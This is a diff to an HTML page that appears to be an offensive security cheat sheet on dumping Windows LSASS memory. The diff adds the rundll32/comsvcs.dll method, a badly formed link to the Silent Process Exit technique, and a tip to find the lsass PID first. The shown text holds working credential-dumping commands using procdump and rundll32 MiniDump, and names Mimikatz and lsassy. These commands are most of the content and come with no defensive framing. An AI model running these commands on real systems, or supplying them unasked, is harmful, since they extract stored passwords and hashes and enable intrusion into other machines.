@@ -474,13 +474,15 @@ and the protection (<a href="https://support.microsoft.com/en-us/help/2962486/ms
 <li>Mimikatz</li>
 <li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank">ProcDump</a></li>
 <li>TaskManager</li>
-<li>Rundll32</li>
+<li>Rundll32 &amp; comsvcs.dll</li>
 <li><a href="https://github.com/Hackndo/lsassy" target="_blank">lsassy</a></li>
+<li>[Silent Process Exit mechanism)(https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)</li>
 </ul>
 <h4 id="procdump">Procdump</h4>
 <pre><code class="language-bash">procdump -accepteula -ma lsass.exe lsass.dmp
 </code></pre>
 <h4 id="rundll32-comsvcsdll">Rundll32 &amp; comsvcs.dll</h4>
+<p>You need to get the PID of <code>lsass</code> before dumping it.</p>
 <pre><code class="language-bash">tasklist /fi &quot;imagename eq lsass.exe&quot;
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; lsass.dmp full
 </code></pre>
